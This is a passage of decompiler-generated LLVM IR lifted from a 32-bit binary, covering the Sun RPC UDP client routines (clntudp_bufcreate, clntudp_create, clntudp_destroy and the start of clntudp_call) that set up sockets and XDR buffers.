  %v1_80626ee = add i32 %v3_8062668, 88
  %v2_80626ee = inttoptr i32 %v1_80626ee to i32*
  %v3_80626ee = load i32, i32* %v2_80626ee, align 4
  store i32 %v3_80626ee, i32* %edx.global-to-local, align 4
  %v2_80626f1 = load i32, i32* %arg3, align 4
  %v1_80626f3 = add i32 %v2_80626f1, -1
  %v1_80626f4 = call i32 @llvm.bswap.i32(i32 %v1_80626f3)
  %v2_80626f6 = inttoptr i32 %v3_80626ee to i32*
  store i32 %v1_80626f4, i32* %v2_80626f6, align 4
  %v0_80626f8.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062716.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80626f8

dec_label_pc_80626f8:                             ; preds = %entry, %dec_label_pc_80626ee
  %v1_8062716.pre = phi i32 [ %tmp7, %entry ], [ %v1_8062716.pre.pre, %dec_label_pc_80626ee ]
  %v0_80626f8 = phi i32 [ %v3_8062668, %entry ], [ %v0_80626f8.pre, %dec_label_pc_80626ee ]
  %v1_80626f8 = add i32 %v0_80626f8, 88
  %v2_80626f8 = inttoptr i32 %v1_80626f8 to i32*
  %v3_80626f8 = load i32, i32* %v2_80626f8, align 4
  %v1_80626fb = add i32 %v3_80626f8, 16
  %v2_80626fb = inttoptr i32 %v1_80626fb to i32*
  %v3_80626fb = load i32, i32* %v2_80626fb, align 4
  %v1_80626fe = call i32 @llvm.bswap.i32(i32 %v3_80626fb)
  br label %dec_label_pc_8062716

dec_label_pc_8062702:                             ; preds = %entry
  %v1_8062702 = add i32 %v3_8062668, 88
  %v2_8062702 = inttoptr i32 %v1_8062702 to i32*
  %v3_8062702 = load i32, i32* %v2_8062702, align 4
  store i32 %v3_8062702, i32* %edx.global-to-local, align 4
  %v2_8062705 = load i32, i32* %arg3, align 4
  %v1_8062707 = call i32 @llvm.bswap.i32(i32 %v2_8062705)
  %v2_8062709 = add i32 %v3_8062702, 16
  %v3_8062709 = inttoptr i32 %v2_8062709 to i32*
  store i32 %v1_8062707, i32* %v3_8062709, align 4
  br label %dec_label_pc_8062724

dec_label_pc_806270e:                             ; preds = %entry
  %v1_806270e = add i32 %v3_8062668, 88
  %v2_806270e = inttoptr i32 %v1_806270e to i32*
  %v3_806270e = load i32, i32* %v2_806270e, align 4
  %v1_8062711 = add i32 %v3_806270e, 12
  %v2_8062711 = inttoptr i32 %v1_8062711 to i32*
  %v3_8062711 = load i32, i32* %v2_8062711, align 4
  %v1_8062714 = call i32 @llvm.bswap.i32(i32 %v3_8062711)
  br label %dec_label_pc_8062716

dec_label_pc_8062716:                             ; preds = %dec_label_pc_80626f8, %dec_label_pc_80626e5, %dec_label_pc_80626e1, %dec_label_pc_806270e
  %v1_8062716 = phi i32 [ %v1_8062716.pre, %dec_label_pc_80626f8 ], [ %tmp7, %dec_label_pc_80626e5 ], [ %tmp7, %dec_label_pc_80626e1 ], [ %tmp7, %dec_label_pc_806270e ]
  %v0_8062716 = phi i32 [ %v1_80626fe, %dec_label_pc_80626f8 ], [ %v1_80626ea, %dec_label_pc_80626e5 ], [ %v2_80626e1, %dec_label_pc_80626e1 ], [ %v1_8062714, %dec_label_pc_806270e ]
  %v2_8062716 = inttoptr i32 %v1_8062716 to i32*
  store i32 %v0_8062716, i32* %v2_8062716, align 4
  br label %dec_label_pc_8062724

dec_label_pc_806271a:                             ; preds = %entry
  %v1_806271a = add i32 %v3_8062668, 88
  %v2_806271a = inttoptr i32 %v1_806271a to i32*
  %v3_806271a = load i32, i32* %v2_806271a, align 4
  store i32 %v3_806271a, i32* %edx.global-to-local, align 4
  %v2_806271d = load i32, i32* %arg3, align 4
  %v1_806271f = call i32 @llvm.bswap.i32(i32 %v2_806271d)
  %v2_8062721 = add i32 %v3_806271a, 12
  %v3_8062721 = inttoptr i32 %v2_8062721 to i32*
  store i32 %v1_806271f, i32* %v3_8062721, align 4
  br label %dec_label_pc_8062724

dec_label_pc_8062724:                             ; preds = %dec_label_pc_8062702, %dec_label_pc_8062716, %dec_label_pc_80626b0, %dec_label_pc_80626c3, %dec_label_pc_806269b, %dec_label_pc_806268f, %dec_label_pc_8062683, %dec_label_pc_806271a
  br label %dec_label_pc_8062729

dec_label_pc_8062729:                             ; preds = %dec_label_pc_80626ca, %dec_label_pc_806267c, %dec_label_pc_8062724
  %v0_806272c = phi i32 [ 1, %dec_label_pc_80626ca ], [ 0, %dec_label_pc_806267c ], [ 1, %dec_label_pc_8062724 ]
  %v2_8062729 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8062729, i32* %edx.global-to-local, align 4
  ret i32 %v0_806272c

; uselistorder directives
  uselistorder i32 %v3_8062668, { 15, 14, 13, 11, 12, 10, 7, 3, 6, 5, 4, 2, 1, 0, 9, 8, 16 }
  uselistorder i32 %tmp7, { 4, 5, 6, 0, 2, 3, 1, 7 }
  uselistorder i32* %edx.global-to-local, { 10, 0, 1, 2, 6, 3, 4, 5, 7, 8, 9 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %arg3, { 5, 4, 3, 1, 2, 0, 6 }
  uselistorder label %dec_label_pc_8062729, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062724, { 7, 1, 0, 3, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_8062716, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80626f8, { 1, 0 }
  uselistorder label %dec_label_pc_80626c3, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp13 = ptrtoint i32* %arg5 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806272e = load i32, i32* @edi, align 4
  %v0_806272f = load i32, i32* @esi, align 4
  %v0_8062730 = load i32, i32* @ebx, align 4
  store i32 %v0_8062730, i32* %stack_var_-16, align 4
  %v2_8062736 = call i32 @malloc(i32 12)
  %v1_8062749 = add i32 %arg6, 3
  %v1_806274c = add i32 %arg7, 3
  %v1_806274f = and i32 %v1_8062749, -4
  store i32 %v1_806274f, i32* @edi, align 4
  %v1_8062752 = and i32 %v1_806274c, -4
  store i32 %v1_8062752, i32* @ebx, align 4
  store i32 %v2_8062736, i32* @ebp, align 4
  %v2_8062757 = add i32 %v1_806274f, 100
  %v3_8062757 = add i32 %v2_8062757, %v1_8062752
  store i32 %v3_8062757, i32* %eax.global-to-local, align 4
  %v2_806275e = call i32 @malloc(i32 %v3_8062757)
  store i32 %v2_806275e, i32* %eax.global-to-local, align 4
  store i32 %v2_806275e, i32* @esi, align 4
  %v0_8062768 = load i32, i32* @ebp, align 4
  %v1_8062768 = icmp eq i32 %v0_8062768, 0
  br i1 %v1_8062768, label %dec_label_pc_8062770, label %dec_label_pc_806276c

dec_label_pc_806276c:                             ; preds = %entry
  %v1_806276c = icmp eq i32 %v2_806275e, 0
  %v1_806276e = icmp eq i1 %v1_806276c, false
  br i1 %v1_806276e, label %dec_label_pc_806279e, label %dec_label_pc_8062770

dec_label_pc_8062770:                             ; preds = %entry, %dec_label_pc_806276c
  %v0_8062770 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8062770, i32* %eax.global-to-local, align 4
  %v0_80627771 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  store i32 %v0_8062770, i32* @ebx, align 4
  %v4_8062784 = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_806e5f8.851 to i32), i32 %v0_80627771)
  store i32 %v4_8062784, i32* %eax.global-to-local, align 4
  %v0_806278c = load i32, i32* @ebx, align 4
  %v1_806278c = inttoptr i32 %v0_806278c to i32*
  store i32 12, i32* %v1_806278c, align 4
  %v0_8062792 = load i32, i32* @ebx, align 4
  %v1_8062792 = add i32 %v0_8062792, 8
  %v2_8062792 = inttoptr i32 %v1_8062792 to i32*
  store i32 12, i32* %v2_8062792, align 4
  br label %dec_label_pc_8062939

dec_label_pc_806279e:                             ; preds = %dec_label_pc_806276c
  %v1_806279e = load i32, i32* @ebx, align 4
  %v2_806279e = add i32 %v2_806275e, 96
  %v3_806279e = add i32 %v2_806279e, %v1_806279e
  %v2_80627a2 = add i32 %v2_806275e, 88
  %v3_80627a2 = inttoptr i32 %v2_80627a2 to i32*
  store i32 %v3_806279e, i32* %v3_80627a2, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_80627a9 = add i32 %arg1, 2
  %v2_80627a9 = inttoptr i32 %v1_80627a9 to i16*
  %v3_80627a9 = load i16, i16* %v2_80627a9, align 2
  %v4_80627a9 = icmp eq i16 %v3_80627a9, 0
  %v1_80627ae = icmp eq i1 %v4_80627a9, false
  br i1 %v1_80627ae, label %dec_label_pc_806279e.dec_label_pc_80627d8_crit_edge, label %dec_label_pc_80627b0

dec_label_pc_806279e.dec_label_pc_80627d8_crit_edge: ; preds = %dec_label_pc_806279e
  br label %dec_label_pc_80627d8

dec_label_pc_80627b0:                             ; preds = %dec_label_pc_806279e
  %v6_80627bb = call i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 17)
  store i32 %v6_80627bb, i32* %eax.global-to-local, align 4
  %v3_80627c3 = trunc i32 %v6_80627bb to i16
  %v4_80627c3 = icmp eq i16 %v3_80627c3, 0
  br i1 %v4_80627c3, label %dec_label_pc_8062939, label %dec_label_pc_80627cc

dec_label_pc_80627cc:                             ; preds = %dec_label_pc_80627b0
  %v2_80627d0 = call i16 @llvm.bswap.i16(i16 %v3_80627c3)
  %v3_80627d0 = zext i16 %v2_80627d0 to i32
  %v5_80627d0 = and i32 %v6_80627bb, -65536
  %v6_80627d0 = or i32 %v3_80627d0, %v5_80627d0
  store i32 %v6_80627d0, i32* %eax.global-to-local, align 4
  store i16 %v2_80627d0, i16* %v2_80627a9, align 2
  br label %dec_label_pc_80627d8

dec_label_pc_80627d8:                             ; preds = %dec_label_pc_806279e.dec_label_pc_80627d8_crit_edge, %dec_label_pc_80627cc
  %v0_80627d8 = load i32, i32* @ebp, align 4
  %v1_80627d8 = add i32 %v0_80627d8, 4
  %v2_80627d8 = inttoptr i32 %v1_80627d8 to i32*
  store i32 ptrtoint (i32* @global_var_8073fd8.852 to i32), i32* %v2_80627d8, align 4
  %v1_80627df = load i32, i32* @ebp, align 4
  %v2_80627df = add i32 %v1_80627df, 8
  %v3_80627df = inttoptr i32 %v2_80627df to i32*
  store i32 %v2_806275e, i32* %v3_80627df, align 4
  %v1_80627e9 = add i32 %v2_806275e, 8
  store i32 %v1_80627e9, i32* %eax.global-to-local, align 4
  %tmp39 = inttoptr i32 %v1_80627e9 to i16*
  %v6_80627ed = call i32 @memcpy(i16* %tmp39, i32 %arg1, i32 16)
  store i32 %tmp13, i32* %eax.global-to-local, align 4
  %v2_80627fd = add i32 %v2_806275e, 28
  %v3_80627fd = inttoptr i32 %v2_80627fd to i32*
  store i32 %arg4, i32* %v3_80627fd, align 4
  %v0_8062800 = load i32, i32* @ebx, align 4
  %v2_8062800 = add i32 %v2_806275e, 92
  %v3_8062800 = inttoptr i32 %v2_8062800 to i32*
  store i32 %v0_8062800, i32* %v3_8062800, align 4
  %v1_8062803 = add i32 %v2_806275e, 24
  %v2_8062803 = inttoptr i32 %v1_8062803 to i32*
  store i32 16, i32* %v2_8062803, align 4
  %v0_806280a = load i32, i32* %eax.global-to-local, align 4
  %v2_806280a = add i32 %v2_806275e, 32
  %v3_806280a = inttoptr i32 %v2_806280a to i32*
  store i32 %v0_806280a, i32* %v3_806280a, align 4
  %v1_806280d = add i32 %v2_806275e, 36
  %v2_806280d = inttoptr i32 %v1_806280d to i32*
  store i32 -1, i32* %v2_806280d, align 4
  %v1_8062814 = add i32 %v2_806275e, 40
  %v2_8062814 = inttoptr i32 %v1_8062814 to i32*
  store i32 -1, i32* %v2_8062814, align 4
  %v0_806281b = load i32, i32* @edi, align 4
  %v2_806281b = add i32 %v2_806275e, 84
  %v3_806281b = inttoptr i32 %v2_806281b to i32*
  store i32 %v0_806281b, i32* %v3_806281b, align 4
  %v0_806281e = call i32 @_create_xid()
  store i32 %v0_806281e, i32* %stack_var_-72, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-112, align 4
  %v0_8062849 = load i32, i32* @edi, align 4
  %v1_806284a = add i32 %v2_806275e, 56
  store i32 %v1_806284a, i32* @ebx, align 4
  %v3_806284d = load i32, i32* %v3_80627a2, align 4
  %v4_8062851 = inttoptr i32 %v1_806284a to i32*
  %v5_8062851 = call i32 @__GI_xdrmem_create(i32* %v4_8062851, i32 %v3_806284d, i32 %v0_8062849, i32 0)
  %v2_8062859 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8062859, i32* @eax, align 4
  %v0_806285e = load i32, i32* @ebx, align 4
  %tmp41 = inttoptr i32 %v0_806285e to i32*
  %v5_806285f = call i32 @__GI_xdr_callhdr(i32* %tmp41, i32 %v2_8062859)
  store i32 %v5_806285f, i32* %eax.global-to-local, align 4
  %v1_8062867 = icmp eq i32 %v5_806285f, 0
  br i1 %v1_8062867, label %dec_label_pc_8062939, label %dec_label_pc_806286f

dec_label_pc_806286f:                             ; preds = %dec_label_pc_80627d8
  %v1_8062872 = add i32 %v2_806275e, 60
  %v2_8062872 = inttoptr i32 %v1_8062872 to i32*
  %v3_8062872 = load i32, i32* %v2_8062872, align 4
  store i32 %v3_8062872, i32* %eax.global-to-local, align 4
  store i32 134621305, i32* %stack_var_-112, align 4
  %v5_8062876 = add i32 %v3_8062872, 16
  %v6_8062876 = inttoptr i32 %v5_8062876 to i32*
  %v7_8062876 = load i32, i32* %v6_8062876, align 4
  call void @__pseudo_call(i32 %v7_8062876)
  %v0_806287c = load i32, i32* %eax.global-to-local, align 4
  %v2_806287c = add i32 %v2_806275e, 80
  %v3_806287c = inttoptr i32 %v2_806287c to i32*
  store i32 %v0_806287c, i32* %v3_806287c, align 4
  store i32 %tmp13, i32* %eax.global-to-local, align 4
  %v2_8062883 = load i32, i32* %arg5, align 4
  %v4_8062883 = icmp slt i32 %v2_8062883, 0
  %v1_8062886 = icmp eq i1 %v4_8062883, false
  br i1 %v1_8062886, label %dec_label_pc_8062920, label %dec_label_pc_806288c

dec_label_pc_806288c:                             ; preds = %dec_label_pc_806286f
  store i32 1, i32* %stack_var_-24, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v5_806289b = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v5_806289b, i32* %eax.global-to-local, align 4
  %v2_80628aa = icmp slt i32 %v5_806289b, 0
  store i32 %v5_806289b, i32* %arg5, align 4
  %v1_80628ae = icmp eq i1 %v2_80628aa, false
  br i1 %v1_80628ae, label %dec_label_pc_80628c9, label %dec_label_pc_80628b0

dec_label_pc_80628b0:                             ; preds = %dec_label_pc_806288c
  %v0_80628b0 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_80628b0, i32* %eax.global-to-local, align 4
  store i32 %v0_80628b0, i32* @ebx, align 4
  %v1_80628b7 = inttoptr i32 %v0_80628b0 to i32*
  store i32 12, i32* %v1_80628b7, align 4
  %v0_80628bd = load i32, i32* %stack_var_-112, align 4
  %v1_80628bd = call i32 @__errno_location(i32 %v0_80628bd)
  store i32 %v1_80628bd, i32* %eax.global-to-local, align 4
  %v1_80628c2 = inttoptr i32 %v1_80628bd to i32*
  %v2_80628c2 = load i32, i32* %v1_80628c2, align 4
  store i32 %v2_80628c2, i32* %eax.global-to-local, align 4
  %v1_80628c4 = load i32, i32* @ebx, align 4
  %v2_80628c4 = add i32 %v1_80628c4, 8
  %v3_80628c4 = inttoptr i32 %v2_80628c4 to i32*
  store i32 %v2_80628c2, i32* %v3_80628c4, align 4
  br label %dec_label_pc_8062939

dec_label_pc_80628c9:                             ; preds = %dec_label_pc_806288c
  %v0_80628c9 = load i32, i32* @ecx, align 4
  store i32 %v5_806289b, i32* %stack_var_-112, align 4
  %v7_80628ce = call i32 @__GI_bindresvport(i32 %v5_806289b, i16* null, i32 %v0_80628c9, i32 %v0_80628c9)
  store i32 %tmp13, i32* %eax.global-to-local, align 4
  %v2_80628e7 = load i32, i32* %arg5, align 4
  store i32 %v2_80628e7, i32* %stack_var_-112, align 4
  %v4_80628e9 = ptrtoint i32* %stack_var_-24 to i32
  %v5_80628e9 = call i32 @ioctl(i32 %v2_80628e7, i32 21537, i32 %v4_80628e9)
  %v2_80628ee = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80628ee, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  store i32 4, i32* %stack_var_-112, align 4
  %v2_806290d = load i32, i32* %arg5, align 4
  %v5_806290f = call i32 @__GI_setsockopt(i32 %v2_806290d, i32 0, i32 11, i32 %v2_80628ee, i32 4)
  store i32 %v5_806290f, i32* %eax.global-to-local, align 4
  %v1_8062917 = add i32 %v2_806275e, 4
  %v2_8062917 = inttoptr i32 %v1_8062917 to i32*
  store i32 1, i32* %v2_8062917, align 4
  br label %dec_label_pc_8062927

dec_label_pc_8062920:                             ; preds = %dec_label_pc_806286f
  %v1_8062920 = add i32 %v2_806275e, 4
  %v2_8062920 = inttoptr i32 %v1_8062920 to i32*
  store i32 0, i32* %v2_8062920, align 4
  br label %dec_label_pc_8062927

dec_label_pc_8062927:                             ; preds = %dec_label_pc_80628c9, %dec_label_pc_8062920
  %v2_806292b = load i32, i32* %arg5, align 4
  store i32 %v2_806292b, i32* %eax.global-to-local, align 4
  %v2_806292d = inttoptr i32 %v2_806275e to i32*
  store i32 %v2_806292b, i32* %v2_806292d, align 4
  %v0_806292f = call i32 @authnone_create()
  store i32 %v0_806292f, i32* %eax.global-to-local, align 4
  %v1_8062934 = load i32, i32* @ebp, align 4
  %v2_8062934 = inttoptr i32 %v1_8062934 to i32*
  store i32 %v0_806292f, i32* %v2_8062934, align 4
  br label %dec_label_pc_806295b

dec_label_pc_8062939:                             ; preds = %dec_label_pc_80627d8, %dec_label_pc_80627b0, %dec_label_pc_80628b0, %dec_label_pc_8062770
  %v1_8062939 = icmp eq i32 %v2_806275e, 0
  br i1 %v1_8062939, label %dec_label_pc_8062949, label %dec_label_pc_806293d

dec_label_pc_806293d:                             ; preds = %dec_label_pc_8062939
  %v2_8062941 = call i32 @free(i32 %v2_806275e)
  store i32 %v2_8062941, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062949

dec_label_pc_8062949:                             ; preds = %dec_label_pc_8062939, %dec_label_pc_806293d
  %v0_8062949 = load i32, i32* @ebp, align 4
  %v1_8062949 = icmp eq i32 %v0_8062949, 0
  br i1 %v1_8062949, label %dec_label_pc_806295b, label %dec_label_pc_806294d

dec_label_pc_806294d:                             ; preds = %dec_label_pc_8062949
  store i32 0, i32* @ebp, align 4
  %v2_8062953 = call i32 @free(i32 %v0_8062949)
  store i32 %v2_8062953, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806295b

dec_label_pc_806295b:                             ; preds = %dec_label_pc_8062949, %dec_label_pc_8062927, %dec_label_pc_806294d
  %v0_806295e = load i32, i32* @ebp, align 4
  store i32 %v0_806295e, i32* %eax.global-to-local, align 4
  %v2_8062961 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8062961, i32* @esi, align 4
  store i32 %v0_806272f, i32* @edi, align 4
  store i32 %v0_806272e, i32* @ebp, align 4
  ret i32 %v0_806295e

; uselistorder directives
  uselistorder i32 %v5_806289b, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v6_80627bb, { 1, 0, 2 }
  uselistorder i32 %v2_806275e, { 5, 0, 3, 7, 17, 6, 14, 15, 12, 11, 2, 10, 8, 9, 1, 13, 4, 16, 20, 18, 19, 21 }
  uselistorder i32* %stack_var_-112, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32 %tmp13, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* %arg5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_806295b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062949, { 1, 0 }
  uselistorder label %dec_label_pc_8062939, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8062927, { 1, 0 }
  uselistorder label %dec_label_pc_80627d8, { 1, 0 }
  uselistorder label %dec_label_pc_8062770, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v8_806298a = inttoptr i32 %arg5 to i32*
  %v9_806298a = call i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %v8_806298a, i32 %arg6, i32 8800, i32 8800)
  ret i32 %v9_806298a
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8062993 = load i32, i32* @esi, align 4
  %v0_8062994 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_806299c = add i32 %arg1, 8
  %v2_806299c = inttoptr i32 %v1_806299c to i32*
  %v3_806299c = load i32, i32* %v2_806299c, align 4
  store i32 %v3_806299c, i32* @ebx, align 4
  %v1_806299f = add i32 %v3_806299c, 4
  %v2_806299f = inttoptr i32 %v1_806299f to i32*
  %v3_806299f = load i32, i32* %v2_806299f, align 4
  %v4_806299f = icmp eq i32 %v3_806299f, 0
  br i1 %v4_806299f, label %dec_label_pc_80629b2, label %dec_label_pc_80629a5

dec_label_pc_80629a5:                             ; preds = %entry
  %v1_80629a8 = inttoptr i32 %v3_806299c to i32*
  %v2_80629a8 = load i32, i32* %v1_80629a8, align 4
  %v1_80629aa = call i32 @__libc_close(i32 %v2_80629a8)
  %v0_80629b2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80629b2

dec_label_pc_80629b2:                             ; preds = %entry, %dec_label_pc_80629a5
  %v0_80629bf = phi i32 [ %v3_806299c, %entry ], [ %v0_80629b2.pre, %dec_label_pc_80629a5 ]
  %v1_80629b2 = add i32 %v0_80629bf, 60
  %v2_80629b2 = inttoptr i32 %v1_80629b2 to i32*
  %v3_80629b2 = load i32, i32* %v2_80629b2, align 4
  %v1_80629b5 = add i32 %v3_80629b2, 28
  %v2_80629b5 = inttoptr i32 %v1_80629b5 to i32*
  %v3_80629b5 = load i32, i32* %v2_80629b5, align 4
  %v1_80629b8 = icmp eq i32 %v3_80629b5, 0
  br i1 %v1_80629b8, label %dec_label_pc_80629c8, label %dec_label_pc_80629bc

dec_label_pc_80629bc:                             ; preds = %dec_label_pc_80629b2
  call void @__pseudo_call(i32 %v3_80629b5)
  %v0_80629cb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80629c8

dec_label_pc_80629c8:                             ; preds = %dec_label_pc_80629b2, %dec_label_pc_80629bc
  %v0_80629cb = phi i32 [ %v0_80629cb.pre, %dec_label_pc_80629bc ], [ %v0_80629bf, %dec_label_pc_80629b2 ]
  %v1_80629cc = call i32 @free(i32 %v0_80629cb)
  %v0_80629d1 = load i32, i32* @esi, align 4
  store i32 %v0_8062994, i32* @ebx, align 4
  store i32 %v0_8062993, i32* @esi, align 4
  %v1_80629da = call i32 @free(i32 %v0_80629d1)
  ret i32 %v1_80629da

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80629c8, { 1, 0 }
  uselistorder label %dec_label_pc_80629b2, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp79 = call i16 @__decompiler_undefined_function_2()
  %tmp80 = call i8 @__decompiler_undefined_function_5()
  %tmp88 = call i8 @__decompiler_undefined_function_5()
  %tmp89 = call i8 @__decompiler_undefined_function_5()
  %tmp90 = call i32 @__decompiler_undefined_function_0()
  %tmp92 = call i32 @__decompiler_undefined_function_0()
  %tmp111 = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i16, align 2
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80629df = load i32, i32* @ebp, align 4
  store i32 %v0_80629df, i32* %stack_var_-4, align 4
  %v4_80629df = ptrtoint i32* %stack_var_-4 to i32
  store i32 1000, i32* %edx.global-to-local, align 4
  store i32 %v4_80629df, i32* @ebp, align 4
  %v0_80629e7 = load i32, i32* @edi, align 4
  %v0_80629e8 = load i32, i32* @esi, align 4
  %v0_80629e9 = load i32, i32* @ebx, align 4
  %v15_80629ea = ptrtoint i32* %stack_var_-9036 to i32
  store i32 1000, i32* @ebx, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_80629f5 = add i32 %tmp111, 8
  %v2_80629f5 = inttoptr i32 %v1_80629f5 to i32*
  %v3_80629f5 = load i32, i32* %v2_80629f5, align 4
  store i32 %v3_80629f5, i32* @esi, align 4
  %v2_80629f8 = add i32 %v3_80629f5, 28
  %v3_80629f8 = inttoptr i32 %v2_80629f8 to i32*
  %v4_80629f8 = load i32, i32* %v3_80629f8, align 4
  %v6_80629f8 = mul i32 %v4_80629f8, 1000
  store i32 %v6_80629f8, i32* %ecx.global-to-local, align 4
  %v1_80629ff = add i32 %v3_80629f5, 32
  %v2_80629ff = inttoptr i32 %v1_80629ff to i32*
  %v3_80629ff = load i32, i32* %v2_80629ff, align 4
  %v1_8062a02 = ashr i32 %v3_80629ff, 31
  %v2_8062a03 = zext i32 %v3_80629ff to i64
  %v4_8062a03 = zext i32 %v1_8062a02 to i64
  %v5_8062a03 = mul nuw i64 %v4_8062a03, 4294967296
  %v6_8062a03 = or i64 %v5_8062a03, %v2_8062a03
  %v8_8062a03 = sdiv i64 %v6_8062a03, 1000
  %v9_8062a03 = trunc i64 %v8_8062a03 to i32
  store i32 %v9_8062a03, i32* %eax.global-to-local, align 4
  %v10_8062a03 = srem i64 %v6_8062a03, 1000
  %v11_8062a03 = trunc i64 %v10_8062a03 to i32
  store i32 %v11_8062a03, i32* %edx.global-to-local, align 4
  %v2_8062a05 = add i32 %v9_8062a03, %v6_80629f8
  store i32 %v2_8062a05, i32* %ecx.global-to-local, align 4
  %v1_8062a0d = add i32 %v3_80629f5, 40
  %v2_8062a0d = inttoptr i32 %v1_8062a0d to i32*
  %v3_8062a0d = load i32, i32* %v2_8062a0d, align 4
  %v13_8062a0d = icmp eq i32 %v3_8062a0d, -1
  %v1_8062a11 = icmp eq i1 %v13_8062a0d, false
  br i1 %v1_8062a11, label %dec_label_pc_8062a4a, label %dec_label_pc_8062a13

dec_label_pc_8062a13:                             ; preds = %entry
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8062a5c

dec_label_pc_8062a27:                             ; preds = %dec_label_pc_8062b29
  %v1_8062a27 = call i32 @__errno_location(i32 %storemerge3)
  store i32 %v1_8062a27, i32* %eax.global-to-local, align 4
  %v1_8062a2c = inttoptr i32 %v1_8062a27 to i32*
  %v2_8062a2c = load i32, i32* %v1_8062a2c, align 4
  store i32 %v2_8062a2c, i32* %eax.global-to-local, align 4
  %v0_8062a2e = load i32, i32* @esi, align 4
  %v1_8062a2e = add i32 %v0_8062a2e, 44
  %v2_8062a2e = inttoptr i32 %v1_8062a2e to i32*
  store i32 3, i32* %v2_8062a2e, align 4
  %v0_8062a35 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062a35 = load i32, i32* @esi, align 4
  %v2_8062a35 = add i32 %v1_8062a35, 48
  %v3_8062a35 = inttoptr i32 %v2_8062a35 to i32*
  store i32 %v0_8062a35, i32* %v3_8062a35, align 4
  store i32 3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062f33

dec_label_pc_8062a42:                             ; preds = %dec_label_pc_8062de1
  %v1_8062a42 = add i32 %v0_8062a42, 12
  %v2_8062a42 = inttoptr i32 %v1_8062a42 to i32*
  %v3_8062a42 = load i32, i32* %v2_8062a42, align 4
  store i32 %v3_8062a42, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062e45

dec_label_pc_8062a4a:                             ; preds = %entry
  store i32 %v3_8062a0d, i32* %ecx.global-to-local, align 4
  %v1_8062a53 = add i32 %v3_80629f5, 36
